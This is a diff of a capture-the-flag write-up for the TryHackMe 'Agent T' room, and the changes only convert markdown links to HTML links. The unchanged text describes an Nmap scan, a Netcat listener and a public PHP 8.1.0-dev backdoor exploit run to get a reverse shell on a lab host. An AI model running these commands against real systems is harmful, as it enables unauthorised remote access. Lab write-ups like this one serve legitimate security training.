@@ -7,7 +7,8 @@ title: Agent T
 
 # Agent T
 
-[**Try it yourself**](https://tryhackme.com/room/agentt)  
+<a href="https://tryhackme.com/room/agentt/" target="_blank" rel="noopener">Try it yourself</a>
+
 **Difficulty:** Easy  
 **Category:** Web Exploitation
 
@@ -22,7 +23,7 @@ We started with an Nmap scan (`nmap -A 10.113.136.236`) to identify open ports a
 </details>
 
 ## 2. Exploitation
-To exploit the vulnerability, we referenced a Python exploit script named `revshell_php_8.1.0-dev.py` from [@flast101](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/). We set up a Netcat listener on our attacker machine using `nc -nlvp 4444`. We then executed the exploit script (`python3 expl.py http://10.113.136.236 10.113.126.254 4444`) to trigger the backdoor and send a reverse shell back to our listener.
+To exploit the vulnerability, we referenced a Python exploit script named `revshell_php_8.1.0-dev.py` from <a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/" target="_blank" rel="noopener">@flast101</a>. We set up a Netcat listener on our attacker machine using `nc -nlvp 4444`. We then executed the exploit script (`python3 expl.py http://10.113.136.236 10.113.126.254 4444`) to trigger the backdoor and send a reverse shell back to our listener.
 
 <details>
 <summary>revshell</summary>
